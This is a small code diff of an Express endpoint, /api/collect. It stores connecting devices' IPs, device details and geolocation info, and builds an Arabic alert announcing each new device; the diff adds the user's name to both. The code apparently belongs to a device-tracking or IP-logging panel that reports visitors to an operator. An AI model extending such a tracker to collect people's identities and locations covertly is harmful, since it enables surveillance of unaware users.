@@ -128,6 +128,7 @@ app.post('/api/collect', async (req, res) => {
     // Register as live device
     liveDevices[deviceId] = {
         deviceId,
+        userName: data.userName || '',
         ip: realIP,
         device: data.device || {},
         ipInfo: data.ipInfo || {},
@@ -155,6 +156,7 @@ app.post('/api/collect', async (req, res) => {
     let message = `🔔 <b>📍 جهاز جديد متصل!</b>\n`;
     message += `━━━━━━━━━━━━━━━━━━\n`;
     message += `🕐 <b>الوقت:</b> ${now}\n`;
+    if (data.userName) message += `👤 <b>الاسم:</b> ${data.userName}\n`;
     message += `🆔 <b>معرّف:</b> <code>${deviceId}</code>\n`;
     message += `🌐 <b>IP:</b> <code>${realIP}</code>\n`;
 
